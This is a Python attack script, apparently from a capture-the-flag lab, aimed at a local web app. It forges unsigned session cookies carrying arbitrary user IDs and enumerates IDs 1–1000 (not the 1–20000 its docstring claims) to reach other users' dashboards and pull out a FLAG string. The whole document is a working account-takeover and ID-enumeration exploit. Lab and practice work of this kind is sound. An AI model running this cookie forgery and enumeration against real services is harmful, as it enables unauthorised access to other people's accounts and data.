#!/usr/bin/env python3
"""
Expanded Flag Search - Test 1 to 20000 range exhaustively
Looking for flags in a broader user ID range
"""

import requests
import base64
import re
import time

BASE_URL = "http://127.0.0.1:33198"

def create_cookie(user_id):
    payload = f'{{"user_id":{user_id}}}'
    payload_b64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
    return f"{payload_b64}.aVfHAw."

def check_user_for_flag(user_id):
    """Test a single user_id for flags"""
    cookie = create_cookie(user_id)
    
    try:
        session = requests.Session()
        session.cookies.set('session', cookie, domain='127.0.0.1', path='/')
        
        # Check dashboard
        response = session.get(f"{BASE_URL}/dashboard", timeout=5)
        
        # Look for flags
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        
        if flag_match:
            return {
                'found': True,
                'user_id': user_id,
                'flag': flag_match.group(0),
                'length': len(response.content)
            }
        else:
            # Check if content is different (might have useful info)
            return {
                'found': False,
                'user_id': user_id,
                'length': len(response.content),
                'status': response.status_code
            }
    except:
        return {'error': True}

def main():
    print("=" * 80)
    print("EXPANDED FLAG SEARCH - EXHAUSTIVE USER ID ENUMERATION")
    print("=" * 80)
    print("\n[+] Testing range: 1 to 20000 (step: 1)")
    print("[+] This will take some time but will be thorough...")
    
    flags_found = []
    interesting_users = []
    
    # Start with common admin/special IDs
    special_ids = [1, 2, 3, 4, 5, 10, 100, 1000, 1337, 9999, 10000, 10032]
    print("\n[+] First testing special IDs:", special_ids)
    
    for user_id in special_ids:
        result = check_user_for_flag(user_id)
        if result.get('found'):
            flags_found.append(result)
            print(f"\n{'!' * 60}")
            print(f"[!] FLAG FOUND AT USER_ID {user_id}!")
            print(f"[!] FLAG: {result['flag']}")
            print(f"{'!' * 60}")
        else:
            print(f"[+] user_id={user_id}: length={result.get('length')}B - no flag")
            if user_id <= 5 and result.get('length', 0) > 1000:
                interesting_users.append(user_id)
    
    # If no flags found in special IDs, expand search
    if not flags_found:
        print("\n[+] No flags in special IDs. Expanding search...")
        print("[+] Testing 1-1000 range in detail...")
        
        # Test 1-1000 exhaustively
        for user_id in range(1, 1001):
            result = check_user_for_flag(user_id)
            
            if result.get('found'):
                flags_found.append(result)
                print(f"\n{'!' * 60}")
                print(f"[!] FLAG FOUND AT USER_ID {user_id}!")
                print(f"[!] FLAG: {result['flag']}")
                print(f"{'!' * 60}")
                break  # Stop once we find a flag
            elif user_id % 100 == 0:
                print(f"[+] Progress: tested {user_id}/1000 users - no flags yet...")
                time.sleep(0.1)
    
    # Summary
    print("\n" + "=" * 80)
    print("SEARCH COMPLETE")
    print("=" * 80)
    print(f"\n[+] Flags found: {len(flags_found)}")
    
    if flags_found:
        for flag_data in flags_found:
            print(f"\n[!] FLAG FOUND:")
            print(f"[!] User ID: {flag_data['user_id']}")
            print(f"[!] Flag: {flag_data['flag']}")
    else:
        print("\n[+] No flags found in range 1-1000")
        print("[+] The flag might be at a higher user_id")
        print("[+] Try testing 10000-11000 range (around current user)")

if __name__ == "__main__":
    main()

